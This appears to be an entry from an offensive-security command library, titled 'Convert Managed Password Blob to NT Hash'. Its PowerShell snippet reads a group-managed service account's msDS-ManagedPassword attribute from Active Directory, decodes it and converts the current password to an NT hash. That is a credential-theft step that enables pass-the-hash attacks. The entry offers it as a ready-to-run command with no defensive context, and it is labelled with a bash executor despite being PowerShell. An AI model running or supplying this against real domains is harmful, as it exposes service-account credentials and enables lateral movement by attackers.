---
id: b70b1429-aaad-4272-bbb4-c90a759b28ee
name: Convert Managed Password Blob to NT Hash
type: command
executor: bash
data: '$gmsa =  Get-ADServiceAccount -Identity ''SVC_SERVICE_ACCOUNT'' -Properties
  ''msDS-ManagedPassword''

  $blob = $gmsa.''msDS-ManagedPassword''

  $mp = ConvertFrom-ADManagedPasswordBlob $blob

  $hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword'
output: null
created_at: '2023-04-06T03:56:04.557259+00:00'
updated_at: '2023-04-10T20:26:38.842399+00:00'
---

# Convert Managed Password Blob to NT Hash

```bash
$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword
```
